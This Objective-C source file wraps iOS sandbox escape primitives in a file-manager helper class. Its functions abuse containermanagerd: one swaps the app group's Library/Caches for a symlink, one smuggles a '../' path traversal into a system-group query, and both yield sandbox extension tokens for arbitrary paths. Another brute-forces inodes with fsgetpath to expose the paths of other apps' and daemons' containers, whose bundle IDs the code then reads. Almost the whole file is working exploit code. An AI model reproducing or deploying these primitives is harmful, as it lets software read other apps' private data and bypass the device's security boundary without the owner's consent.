//
//  SBXKit.m
//  SandboxFilza
//
//  Sandbox escape primitives extracted verbatim from terminal_worse
//  (src/TerminalSBX.m, GPL-3.0).  Static sbx_* functions are kept as-is;
//  only the Objective-C class wrappers are new.
//

#import "SBXKit.h"

#import <CoreFoundation/CoreFoundation.h>
#import <Security/Security.h>

#include <dlfcn.h>
#include <dirent.h>
#include <errno.h>
#include <limits.h>
#include <pthread.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/fsgetpath.h>
#include <sys/stat.h>
#include <sys/sysctl.h>
#include <sys/xattr.h>
#include <time.h>
#include <unistd.h>
#include <xpc/xpc.h>

// ---------------------------------------------------------------------------
// Global state (from terminal_worse)
// ---------------------------------------------------------------------------

static pthread_mutex_t g_lock = PTHREAD_MUTEX_INITIALIZER;        // handles / group / state
static pthread_mutex_t g_query_lock = PTHREAD_MUTEX_INITIALIZER;  // one containermanager query at a time

static NSMutableArray<NSDictionary *> *g_handles = nil;
static NSMutableSet<NSString *> *g_accessible_roots = nil;
static NSString *g_group = nil;

static NSString *g_last_engine = nil;

static void sbx_mark_root(NSString *root) {
    pthread_mutex_lock(&g_lock);
    if (g_accessible_roots == nil) g_accessible_roots = [NSMutableSet set];
    [g_accessible_roots addObject:root];
    pthread_mutex_unlock(&g_lock);
}

// ---------------------------------------------------------------------------
// Path helpers
// ---------------------------------------------------------------------------

static NSString *sbx_canonical(NSString *raw) {
    if (raw == nil) return @"";
    NSString *path = [raw stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]];
    if (path.length == 0) return @"";
    if ([path hasPrefix:@"file://"]) {
        NSURL *url = [NSURL URLWithString:path];
        if (url.path.length > 0) path = url.path;
    }
    if (![path hasPrefix:@"/"]) {
        NSString *cwd = [[NSFileManager defaultManager] currentDirectoryPath];
        if (cwd.length == 0) cwd = NSHomeDirectory();
        path = [cwd stringByAppendingPathComponent:path];
    }
    path = [path stringByStandardizingPath];
    if ([path isEqualToString:@"/var"] || [path hasPrefix:@"/var/"]) {
        path = [@"/private" stringByAppendingString:path];
    }
    while ([path hasPrefix:@"/private/private/"]) {
        path = [@"/private" stringByAppendingString:[path substringFromIndex:@"/private".length]];
    }
    return path;
}

static BOOL sbx_is_own_path(NSString *path) {
    NSString *home = sbx_canonical(NSHomeDirectory());
    if (path.length == 0 || home.length == 0) return NO;
    if ([path isEqualToString:home]) return YES;
    return [path hasPrefix:[home stringByAppendingString:@"/"]];
}

static BOOL sbx_path_exists(NSString *path) {
    struct stat st;
    return lstat(path.fileSystemRepresentation, &st) == 0;
}

static BOOL sbx_path_is_dir(NSString *path) {
    struct stat st;
    if (lstat(path.fileSystemRepresentation, &st) != 0) return NO;
    return S_ISDIR(st.st_mode) != 0;
}

// ---------------------------------------------------------------------------
// App Group resolution
// ---------------------------------------------------------------------------

static NSArray<NSString *> *sbx_groups_from_profile(void) {
    NSString *profile = [[[NSBundle mainBundle] bundlePath] stringByAppendingPathComponent:@"embedded.mobileprovision"];
    NSData *data = [NSData dataWithContentsOfFile:profile];
    if (data.length == 0) return @[];

    NSData *startTag = [@"<?xml" dataUsingEncoding:NSUTF8StringEncoding];
    NSData *endTag = [@"</plist>" dataUsingEncoding:NSUTF8StringEncoding];
    NSRange start = [data rangeOfData:startTag options:0 range:NSMakeRange(0, data.length)];
    if (start.location == NSNotFound) return @[];
    NSRange end = [data rangeOfData:endTag options:0
                              range:NSMakeRange(start.location, data.length - start.location)];
    if (end.location == NSNotFound) return @[];
    NSRange full = NSMakeRange(start.location, NSMaxRange(end) - start.location);
    NSData *plistData = [data subdataWithRange:full];

    id plist = [NSPropertyListSerialization propertyListWithData:plistData
                                                         options:NSPropertyListImmutable
                                                          format:NULL
                                                           error:NULL];
    if (![plist isKindOfClass:[NSDictionary class]]) return @[];
    id ent = ((NSDictionary *)plist)[@"Entitlements"];
    if (![ent isKindOfClass:[NSDictionary class]]) return @[];
    id groups = ((NSDictionary *)ent)[@"com.apple.security.application-groups"];
    if (![groups isKindOfClass:[NSArray class]]) return @[];
    NSMutableArray *out = [NSMutableArray array];
    for (id g in (NSArray *)groups) {
        if ([g isKindOfClass:[NSString class]]) [out addObject:g];
    }
    return out;
}

static NSArray<NSString *> *sbx_groups_from_entitlements(void) {
    void *sec = dlopen("/System/Library/Frameworks/Security.framework/Security", RTLD_LAZY);
    if (!sec) return @[];

    typedef void *(*task_create_fn)(CFAllocatorRef);
    typedef CFTypeRef (*task_copy_fn)(void *, CFStringRef, CFErrorRef *);
    task_create_fn create = (task_create_fn)dlsym(sec, "SecTaskCreateFromSelf");
    task_copy_fn copy = (task_copy_fn)dlsym(sec, "SecTaskCopyValueForEntitlement");
    if (!create || !copy) return @[];

    void *task = create(NULL);
    if (!task) return @[];
    CFTypeRef value = copy(task, CFSTR("com.apple.security.application-groups"), NULL);
    NSMutableArray *out = [NSMutableArray array];
    if (value) {
        if (CFGetTypeID(value) == CFArrayGetTypeID()) {
            NSArray *arr = (__bridge NSArray *)value;
            for (id g in arr) {
                if ([g isKindOfClass:[NSString class]]) [out addObject:g];
            }
        }
        CFRelease(value);
    }
    CFRelease(task);
    return out;
}

static void sbx_resolve_group(void) {
    pthread_mutex_lock(&g_lock);
    if (g_group != nil) {
        pthread_mutex_unlock(&g_lock);
        return;
    }
    pthread_mutex_unlock(&g_lock);

    NSMutableArray<NSString *> *candidates = [NSMutableArray array];
    void (^add)(id) = ^(id value) {
        if ([value isKindOfClass:[NSString class]] && [(NSString *)value length] > 0 &&
            ![candidates containsObject:value]) {
            [candidates addObject:value];
        }
    };

    add([[NSBundle mainBundle] objectForInfoDictionaryKey:@"AppGroupIdentifier"]);
    for (NSString *g in sbx_groups_from_entitlements()) add(g);
    for (NSString *g in sbx_groups_from_profile()) add(g);

    // Groups provisioned for the signing identity used by this workspace.
    add(@"group.com.cert.account.t260930000125.01");
    add(@"group.com.cert.account.t260930000125.02");
    add(@"group.com.cert.account.t260930000125.03");
    add(@"group.com.cert.account.t260930000125.04");
    add(@"group.com.cert.account.t260930000125.05");
    add(@"group.AsheKube.a-Shell");

    NSFileManager *fm = [NSFileManager defaultManager];
    // The group container is sometimes not visible during the first few
    // hundred milliseconds of app launch.  Retry briefly so commands issued
    // immediately by a URL or .profile do not race the sandbox setup.
    for (int attempt = 0; attempt < 15; attempt++) {
        for (NSString *group in candidates) {
            NSURL *url = [fm containerURLForSecurityApplicationGroupIdentifier:group];
            if (!url) continue;
            NSURL *library = [url URLByAppendingPathComponent:@"Library" isDirectory:YES];
            [fm createDirectoryAtURL:library withIntermediateDirectories:YES attributes:nil error:NULL];
            pthread_mutex_lock(&g_lock);
            g_group = [group copy];
            pthread_mutex_unlock(&g_lock);
            NSLog(@"[SBXKit] app group: %@ at %@", group, url.path);
            return;
        }
        usleep(100000);
    }

    NSLog(@"[SBXKit] no accessible app group; falling back to class-13 primitive");
}

static NSString *sbx_group(void) {
    pthread_mutex_lock(&g_lock);
    NSString *group = g_group;
    pthread_mutex_unlock(&g_lock);
    if (group == nil) {
        sbx_resolve_group();
        pthread_mutex_lock(&g_lock);
        group = g_group;
        pthread_mutex_unlock(&g_lock);
    }
    return group;
}

static void sbx_clean_group_caches(NSString *group) {
    if (group.length == 0) return;
    NSFileManager *fm = [NSFileManager defaultManager];
    NSURL *root = [fm containerURLForSecurityApplicationGroupIdentifier:group];
    if (!root) return;
    NSURL *caches = [root URLByAppendingPathComponent:@"Library/Caches" isDirectory:YES];
    [fm removeItemAtURL:caches error:NULL];
    [fm createDirectoryAtURL:caches withIntermediateDirectories:NO attributes:nil error:NULL];
}

// ---------------------------------------------------------------------------
// worse_query (forcequitOS, GPL-3.0)
// ---------------------------------------------------------------------------

typedef void *(*container_query_create_fn)(void);
typedef void (*container_query_set_class_fn)(void *, uint64_t);
typedef void (*container_query_set_identifiers_fn)(void *, xpc_object_t);
typedef void (*container_query_set_flags_fn)(void *, uint64_t);
typedef void (*container_query_set_part_fn)(void *, uint64_t);
typedef void (*container_query_set_part_domain_fn)(void *, const char *);
typedef void *(*container_query_get_single_result_fn)(void *);
typedef void (*container_query_iterate_results_sync_fn)(void *, void (^)(void *));
typedef void (*container_query_free_fn)(void *);
typedef char *(*container_copy_sandbox_token_fn)(void *);
typedef const char *(*container_object_get_path_fn)(void *);
typedef const char *(*container_object_get_identifier_fn)(void *);
typedef int64_t (*sandbox_extension_consume_fn)(const char *);
typedef int (*sandbox_extension_release_fn)(int64_t);

static int64_t sbx_worse_query(NSString *target, bool alt_flags, bool create_dir) {
    if (target.length == 0 || ![target hasPrefix:@"/"]) return -255;
    if (!create_dir) {
        struct stat st;
        if (lstat(target.fileSystemRepresentation, &st) != 0) return -255;
    }

    NSString *group = sbx_group();
    if (group.length == 0) return -1;

    NSFileManager *fm = [NSFileManager defaultManager];
    NSURL *groupRoot = [fm containerURLForSecurityApplicationGroupIdentifier:group];
    if (!groupRoot) return -1;
    NSString *caches = [[groupRoot URLByAppendingPathComponent:@"Library/Caches"] path];

    void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!mgr) return -2;

    container_query_create_fn query_create = (container_query_create_fn)dlsym(mgr, "container_query_create");
    container_query_set_class_fn query_set_class = (container_query_set_class_fn)dlsym(mgr, "container_query_set_class");
    container_query_set_identifiers_fn query_set_group_identifiers =
        (container_query_set_identifiers_fn)dlsym(mgr, "container_query_set_group_identifiers");
    container_query_set_flags_fn query_set_flags =
        (container_query_set_flags_fn)dlsym(mgr, "container_query_operation_set_flags");
    container_query_set_part_fn query_set_part =
        (container_query_set_part_fn)dlsym(mgr, "container_query_operation_set_part");
    container_query_get_single_result_fn query_get_single_result =
        (container_query_get_single_result_fn)dlsym(mgr, "container_query_get_single_result");
    container_query_free_fn query_free = (container_query_free_fn)dlsym(mgr, "container_query_free");
    container_copy_sandbox_token_fn copy_sandbox_token =
        (container_copy_sandbox_token_fn)dlsym(mgr, "container_copy_sandbox_token");
    sandbox_extension_consume_fn consume_extension =
        (sandbox_extension_consume_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");

    if (!query_create || !query_set_class || !query_set_group_identifiers || !query_set_flags ||
        !query_set_part || !query_get_single_result || !query_free || !copy_sandbox_token ||
        !consume_extension) {
        dlclose(mgr);
        return -2;
    }

    void *query = query_create();
    if (!query) {
        dlclose(mgr);
        return -3;
    }

    xpc_object_t identifier = xpc_string_create(group.UTF8String);
    query_set_class(query, 7); // app group
    query_set_group_identifiers(query, identifier);
    query_set_part(query, 3); // Library/Caches

    if (alt_flags) {
        query_set_flags(query, 0x0000000800000000ULL);
    } else {
        query_set_flags(query, 0x0000008000000000ULL);
    }

    [fm removeItemAtPath:caches error:NULL];
    if (![fm createSymbolicLinkAtPath:caches withDestinationPath:target error:NULL]) {
        query_free(query);
        dlclose(mgr);
        return -4;
    }

    void *result = query_get_single_result(query);
    if (!result) {
        query_free(query);
        dlclose(mgr);
        sbx_clean_group_caches(group);
        return -5;
    }

    char *token = copy_sandbox_token(result);
    if (!token) {
        query_free(query);
        dlclose(mgr);
        sbx_clean_group_caches(group);
        return -6;
    }

    int64_t handle = consume_extension(token);
    free(token);
    query_free(query);
    dlclose(mgr);
    sbx_clean_group_caches(group);
    return handle;
}

static void sbx_release_handle(int64_t handle) {
    if (handle <= 0) return;
    sandbox_extension_release_fn release_extension =
        (sandbox_extension_release_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    if (release_extension) release_extension(handle);
}

// ---------------------------------------------------------------------------
// Class-13 fallback (Veilpath / bad_query lineage)
// ---------------------------------------------------------------------------

static int64_t sbx_fallback_query(NSString *target, bool alt_flags) {
    if (target.length == 0 || ![target hasPrefix:@"/"]) return -255;
    struct stat st;
    if (lstat(target.fileSystemRepresentation, &st) != 0) return -255;

    void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!mgr) return -1;

    container_query_create_fn query_create = (container_query_create_fn)dlsym(mgr, "container_query_create");
    container_query_set_class_fn query_set_class = (container_query_set_class_fn)dlsym(mgr, "container_query_set_class");
    container_query_set_identifiers_fn query_set_group_identifiers =
        (container_query_set_identifiers_fn)dlsym(mgr, "container_query_set_group_identifiers");
    container_query_set_flags_fn query_set_flags =
        (container_query_set_flags_fn)dlsym(mgr, "container_query_operation_set_flags");
    container_query_set_part_fn query_set_part =
        (container_query_set_part_fn)dlsym(mgr, "container_query_operation_set_part");
    container_query_set_part_domain_fn query_set_part_domain =
        (container_query_set_part_domain_fn)dlsym(mgr, "container_query_operation_set_part_domain");
    container_query_get_single_result_fn query_get_single_result =
        (container_query_get_single_result_fn)dlsym(mgr, "container_query_get_single_result");
    container_query_free_fn query_free = (container_query_free_fn)dlsym(mgr, "container_query_free");
    container_copy_sandbox_token_fn copy_sandbox_token =
        (container_copy_sandbox_token_fn)dlsym(mgr, "container_copy_sandbox_token");
    sandbox_extension_consume_fn consume_extension =
        (sandbox_extension_consume_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");

    if (!query_create || !query_set_class || !query_set_group_identifiers || !query_set_flags ||
        !query_set_part || !query_set_part_domain || !query_get_single_result || !query_free ||
        !copy_sandbox_token || !consume_extension) {
        dlclose(mgr);
        return -1;
    }

    void *query = query_create();
    if (!query) { dlclose(mgr); return -3; }

    xpc_object_t identifier = xpc_string_create("systemgroup.com.apple.mobilegestaltcache");
    query_set_class(query, 13);
    query_set_group_identifiers(query, identifier);
    query_set_part(query, 3);

    char *part = NULL;
    if (asprintf(&part, "../../../../../../../..%s", target.fileSystemRepresentation) == -1) {
        query_free(query);
        dlclose(mgr);
        return -5;
    }
    query_set_part_domain(query, part);
    if (alt_flags) {
        query_set_flags(query, 0x0000000800000000ULL);
    } else {
        query_set_flags(query, 0x0000008000000000ULL);
    }

    void *result = query_get_single_result(query);
    if (!result) {
        free(part);
        query_free(query);
        dlclose(mgr);
        return -5;
    }

    char *token = copy_sandbox_token(result);
    if (!token) {
        free(part);
        query_free(query);
        dlclose(mgr);
        return -6;
    }

    int64_t handle = consume_extension(token);
    free(token);
    free(part);
    query_free(query);
    dlclose(mgr);
    return handle;
}

// ---------------------------------------------------------------------------
// Container enumeration
// ---------------------------------------------------------------------------

static NSArray<NSDictionary *> *sbx_enumerate_class(uint64_t container_class) {
    void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!mgr) return nil;

    container_query_create_fn query_create = (container_query_create_fn)dlsym(mgr, "container_query_create");
    container_query_set_class_fn query_set_class = (container_query_set_class_fn)dlsym(mgr, "container_query_set_class");
    container_query_iterate_results_sync_fn iterate =
        (container_query_iterate_results_sync_fn)dlsym(mgr, "container_query_iterate_results_sync");
    container_query_free_fn query_free = (container_query_free_fn)dlsym(mgr, "container_query_free");
    container_object_get_path_fn get_path =
        (container_object_get_path_fn)dlsym(mgr, "container_object_get_path");
    container_object_get_identifier_fn get_identifier =
        (container_object_get_identifier_fn)dlsym(mgr, "container_object_get_identifier");
    if (!get_identifier) get_identifier = (container_object_get_identifier_fn)dlsym(mgr, "container_result_get_identifier");

    if (!query_create || !query_set_class || !iterate || !query_free || !get_path) {
        dlclose(mgr);
        return nil;
    }

    void *query = query_create();
    if (!query) { dlclose(mgr); return nil; }
    query_set_class(query, container_class);

    NSMutableArray<NSDictionary *> *out = [NSMutableArray array];
    __block container_object_get_path_fn blk_get_path = get_path;
    __block container_object_get_identifier_fn blk_get_id = get_identifier;

    iterate(query, ^(void *result) {
        if (!result || !blk_get_path) return;
        const char *path = blk_get_path(result);
        const char *identifier = blk_get_id ? blk_get_id(result) : NULL;
        if (!path || path[0] == '\0') return;
        NSString *p = [NSString stringWithUTF8String:path];
        if (p.length == 0) return;
        p = sbx_canonical(p);
        NSString *i = (identifier && identifier[0]) ? [NSString stringWithUTF8String:identifier] : nil;
        [out addObject:@{@"path": p, @"id": i ?: @""}];
    });

    query_free(query);
    dlclose(mgr);
    return out;
}

// ---------------------------------------------------------------------------
// Inode path enumeration (pathleak)
// ---------------------------------------------------------------------------

static double sbx_now(void) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (double)ts.tv_sec + (double)ts.tv_nsec / 1000000000.0;
}

static NSArray<NSString *> *sbx_pathleak(NSString *root, uint64_t max_inode, double seconds) {
    if (root.length == 0 || max_inode < 1) return nil;
    NSString *dir = sbx_canonical(root);
    while (dir.length > 1 && [dir hasSuffix:@"/"]) dir = [dir substringToIndex:dir.length - 1];

    struct statfs sfs;
    if (statfs(dir.fileSystemRepresentation, &sfs) != 0) {
        NSString *tmp = NSTemporaryDirectory();
        if (tmp.length == 0 || statfs(tmp.fileSystemRepresentation, &sfs) != 0) return nil;
    }
    fsid_t fsid = sfs.f_fsid;

    const char *prefix = dir.fileSystemRepresentation;
    size_t prefix_len = strlen(prefix);
    NSMutableArray<NSString *> *result = [NSMutableArray array];
    char buffer[PATH_MAX];
    double start = sbx_now();

    for (uint64_t inode = 1; inode <= max_inode; inode++) {
        if (seconds > 0 && (inode & 0xFFF) == 0 && (sbx_now() - start) > seconds) break;
        ssize_t n = fsgetpath(buffer, sizeof(buffer), &fsid, inode);
        if (n <= 0) continue;
        if (strncmp(buffer, prefix, prefix_len) != 0) continue;
        if (buffer[prefix_len] != '/') continue;
        if (strchr(buffer + prefix_len + 1, '/') != NULL) continue;
        NSString *path = [[NSFileManager defaultManager] stringWithFileSystemRepresentation:buffer length:strlen(buffer)];
        if (path.length > 0) [result addObject:path];
    }
    [result sortUsingSelector:@selector(localizedStandardCompare:)];
    return result;
}

// ---------------------------------------------------------------------------
// Handle cache
// ---------------------------------------------------------------------------

static void sbx_store_handle(NSString *path, int64_t handle, NSString *engine) {
    if (handle <= 0) return;
    pthread_mutex_lock(&g_lock);
    if (g_handles == nil) g_handles = [NSMutableArray array];
    [g_handles addObject:@{@"path": path, @"handle": @(handle), @"engine": engine ?: @"worse_query"}];
    pthread_mutex_unlock(&g_lock);
}

static int64_t sbx_cached_handle_locked(NSString *path) {
    if (g_handles == nil) return 0;
    NSString *prefix = [path stringByAppendingString:@"/"];
    for (NSDictionary *entry in g_handles) {
        NSString *p = entry[@"path"];
        if ([path isEqualToString:p] || [path hasPrefix:prefix] || [path hasPrefix:[p stringByAppendingString:@"/"]]) {
            return [entry[@"handle"] longLongValue];
        }
    }
    return 0;
}

static BOOL sbx_uses_alt_flags(NSString *path) {
    NSInteger major = [[NSProcessInfo processInfo] operatingSystemVersion].majorVersion;
    return major == 26 && [path containsString:@"/var/mobile/Containers/Shared/AppGroup"];
}

// ---------------------------------------------------------------------------
// Grant
// ---------------------------------------------------------------------------

static int64_t sbx_grant_path(NSString *raw, BOOL create, NSString **engineOut) {
    NSString *path = sbx_canonical(raw);
    if (path.length == 0 || ![path hasPrefix:@"/"]) return -255;
    if (sbx_is_own_path(path)) {
        if (engineOut) *engineOut = @"own-sandbox";
        return 0;
    }

    pthread_mutex_lock(&g_lock);
    int64_t cached = sbx_cached_handle_locked(path);
    pthread_mutex_unlock(&g_lock);
    if (cached > 0) {
        if (engineOut) *engineOut = @"cached";
        return cached;
    }

    NSString *group = sbx_group();
    bool alt = sbx_uses_alt_flags(path);
    int64_t handle = 0;
    NSString *engine = nil;

    pthread_mutex_lock(&g_query_lock);
    if (group.length > 0) {
        handle = sbx_worse_query(path, alt, create);
        if (handle > 0) engine = @"worse_query";
    }
    if (handle <= 0) {
        int64_t fallback = sbx_fallback_query(path, alt);
        if (fallback > 0) {
            handle = fallback;
            engine = @"fallback";
        }
    }
    pthread_mutex_unlock(&g_query_lock);

    if (handle > 0) {
        sbx_store_handle(path, handle, engine);
        if (engineOut) *engineOut = engine;
    } else if (engineOut) {
        *engineOut = nil;
    }
    return handle;
}

static int64_t sbx_grant_mount(NSString *path) {
    int64_t handle = sbx_grant_path(path, NO, NULL);
    if (handle <= 0) handle = sbx_grant_path(path, YES, NULL);
    return handle;
}

static NSString *sbx_symlink_target(NSString *path) {
    char buf[PATH_MAX];
    ssize_t n = readlink(path.fileSystemRepresentation, buf, sizeof(buf) - 1);
    if (n <= 0) return nil;
    buf[n] = '\0';
    NSString *target = [NSString stringWithUTF8String:buf];
    if (target.length == 0) return nil;
    if (![target hasPrefix:@"/"]) {
        target = [[path stringByDeletingLastPathComponent] stringByAppendingPathComponent:target];
    }
    return sbx_canonical(target);
}

static int64_t sbx_grant_item(NSString *raw) {
    NSString *path = sbx_canonical(raw);
    if (sbx_is_own_path(path)) return 0;

    struct stat st;
    if (lstat(path.fileSystemRepresentation, &st) == 0) {
        if (S_ISLNK(st.st_mode)) {
            NSString *target = sbx_symlink_target(path);
            if (target.length > 0) {
                int64_t h = sbx_grant_path(target, NO, NULL);
                if (h > 0) return h;
            }
        }
        if (S_ISDIR(st.st_mode)) return sbx_grant_path(path, NO, NULL);
        NSString *parent = [path stringByDeletingLastPathComponent];
        int64_t h = sbx_grant_path(parent, NO, NULL);
        return h != 0 ? h : sbx_grant_path(path, NO, NULL);
    }

    int64_t h = sbx_grant_path(path, NO, NULL);
    if (h > 0) return h;
    return sbx_grant_path([path stringByDeletingLastPathComponent], NO, NULL);
}

// ---------------------------------------------------------------------------
// Mount points / listing / bundle ID
// ---------------------------------------------------------------------------

static NSArray<NSDictionary *> *sbx_mount_points(void) {
    return @[
        @{@"name": @"system", @"root": @"/private/var/containers/Data/System", @"children": @NO, @"class": @0},
        @{@"name": @"systemgroups", @"root": @"/private/var/containers/Shared/SystemGroup", @"children": @YES, @"class": @11},
        @{@"name": @"apps", @"root": @"/private/var/mobile/Containers/Data/Application", @"children": @YES, @"class": @2},
        @{@"name": @"daemons", @"root": @"/private/var/mobile/Containers/Data/InternalDaemon", @"children": @YES, @"class": @10},
        @{@"name": @"plugins", @"root": @"/private/var/mobile/Containers/Data/PluginKitPlugin", @"children": @YES, @"class": @8},
        @{@"name": @"appgroups", @"root": @"/private/var/mobile/Containers/Shared/AppGroup", @"children": @YES, @"class": @5},
        @{@"name": @"appgroups27", @"root": @"/private/var/containers/Shared/AppGroup", @"children": @YES, @"class": @5}
    ];
}

static NSArray<NSString *> *sbx_list_dir(NSString *path) {
    const char *p = path.fileSystemRepresentation;
    DIR *dir = opendir(p);
    if (!dir) return nil;
    NSMutableArray *entries = [NSMutableArray array];
    struct dirent *ent = NULL;
    while ((ent = readdir(dir)) != NULL) {
        if (strcmp(ent->d_name, ".") == 0 || strcmp(ent->d_name, "..") == 0) continue;
        NSString *name = [NSString stringWithUTF8String:ent->d_name];
        if (name.length > 0) [entries addObject:name];
    }
    closedir(dir);
    [entries sortUsingSelector:@selector(localizedStandardCompare:)];
    return entries;
}

static NSString *sbx_bundle_id(NSString *containerPath) {
    char buf[512];
    memset(buf, 0, sizeof(buf));
    ssize_t len = getxattr(containerPath.fileSystemRepresentation,
                           "com.apple.containermanager.identifier", buf, sizeof(buf) - 1, 0, 0);
    if (len > 0) {
        return [NSString stringWithUTF8String:buf];
    }

    NSString *meta = [containerPath stringByAppendingPathComponent:@".com.apple.mobile_container_manager.metadata.plist"];
    NSData *data = [NSData dataWithContentsOfFile:meta];
    if (data.length == 0) return nil;
    id plist = [NSPropertyListSerialization propertyListWithData:data
                                                         options:NSPropertyListImmutable
                                                          format:NULL
                                                           error:NULL];
    if (![plist isKindOfClass:[NSDictionary class]]) return nil;
    id ident = ((NSDictionary *)plist)[@"MCMMetadataIdentifier"];
    if ([ident isKindOfClass:[NSString class]] && [(NSString *)ident length] > 0) return ident;
    return nil;
}

static void sbx_release_all_internal(void) {
    pthread_mutex_lock(&g_lock);
    NSArray *handles = [g_handles copy];
    [g_handles removeAllObjects];
    pthread_mutex_unlock(&g_lock);
    for (NSDictionary *entry in handles) {
        sbx_release_handle([entry[@"handle"] longLongValue]);
    }
}

// ---------------------------------------------------------------------------
// Objective-C wrappers
// ---------------------------------------------------------------------------

@implementation SBXContainer
- (instancetype)initWithPath:(NSString *)path identifier:(NSString *)identifier {
    self = [super init];
    if (self) {
        _path = [path copy];
        _identifier = identifier ?: @"";
    }
    return self;
}
@end

@implementation SBXKit

+ (NSArray<NSDictionary *> *)mountPoints {
    return sbx_mount_points();
}

+ (nullable NSString *)resolveGroup {
    sbx_resolve_group();
    pthread_mutex_lock(&g_lock);
    NSString *group = g_group;
    pthread_mutex_unlock(&g_lock);
    return group;
}

+ (NSArray<SBXContainer *> *)containersForMountPoint:(NSDictionary *)mountPoint {
    NSString *root = sbx_canonical(mountPoint[@"root"]);
    BOOL children = [mountPoint[@"children"] boolValue];
    NSMutableArray<SBXContainer *> *out = [NSMutableArray array];

    if (!children) {
        if (![self pathExists:root]) return out;
        int64_t h = sbx_grant_mount(root);
        if (h <= 0) return out;
        sbx_mark_root(root);
        for (NSString *entry in sbx_list_dir(root) ?: @[]) {
            [out addObject:[[SBXContainer alloc] initWithPath:[root stringByAppendingPathComponent:entry] identifier:@""]];
        }
        return out;
    }

    // Prefer a real directory listing when the parent grants a token.
    int64_t h = sbx_grant_mount(root);
    NSArray<NSString *> *entries = h > 0 ? sbx_list_dir(root) : nil;
    if (entries != nil) {
        sbx_mark_root(root);
        for (NSString *entry in entries) {
            [out addObject:[[SBXContainer alloc] initWithPath:[root stringByAppendingPathComponent:entry] identifier:@""]];
        }
        return out;
    }

    // iOS 27 refuses a token for the parent; enumerate with fsgetpath, then
    // read bundle IDs per container (like sbx_automount does).
    double seconds = [mountPoint[@"name"] isEqualToString:@"apps"] ? 12.0 : 6.0;
    NSArray<NSString *> *leaked = sbx_pathleak(root, 2000000, seconds);
    for (NSString *child in leaked ?: @[]) {
        NSString *bid = sbx_bundle_id(child) ?: @"";
        [out addObject:[[SBXContainer alloc] initWithPath:child identifier:bid]];
    }
    return out;
}

+ (BOOL)grantPath:(NSString *)path create:(BOOL)create engine:(NSString * _Nullable * _Nullable)engineOut {
    NSString *engine = nil;
    int64_t h = sbx_grant_path(sbx_canonical(path), create, &engine);
    if (h < 0) {
        // own-sandbox returns 0 with engine set; only negative codes fail.
        if (engineOut) *engineOut = nil;
        return NO;
    }
    if (engineOut) *engineOut = engine;
    return YES;
}

+ (BOOL)grantItem:(NSString *)path {
    return sbx_grant_item(path) >= 0;
}

+ (void)releaseAll {
    sbx_release_all_internal();
}

+ (nullable NSArray<NSString *> *)listDir:(NSString *)path {
    return sbx_list_dir(sbx_canonical(path));
}

+ (nullable NSString *)bundleIDForContainer:(NSString *)containerPath {
    return sbx_bundle_id(sbx_canonical(containerPath));
}

+ (BOOL)isOwnPath:(NSString *)path {
    return sbx_is_own_path(sbx_canonical(path));
}

+ (BOOL)pathExists:(NSString *)path {
    return sbx_path_exists(sbx_canonical(path));
}

+ (BOOL)pathIsDir:(NSString *)path {
    return sbx_path_is_dir(sbx_canonical(path));
}

+ (NSString *)errorTextForCode:(int64_t)code {
    switch (code) {
        case -255: return @"target does not exist";
        case -254: return @"not an absolute path";
        case -1:   return @"no usable App Group / container functions unavailable";
        case -2:   return @"failed to resolve containermanager functions";
        case -3:   return @"failed to create container query";
        case -4:   return @"failed to create the Library/Caches symlink";
        case -5:   return @"query rejected by containermanagerd";
        case -6:   return @"kernel refused to issue a sandbox extension";
        default:   return @"unknown error";
    }
}

+ (NSUInteger)activeHandles {
    pthread_mutex_lock(&g_lock);
    NSUInteger n = g_handles.count;
    pthread_mutex_unlock(&g_lock);
    return n;
}

+ (nullable NSString *)lastEngine {
    pthread_mutex_lock(&g_lock);
    NSString *e = g_last_engine;
    pthread_mutex_unlock(&g_lock);
    return e;
}

@end
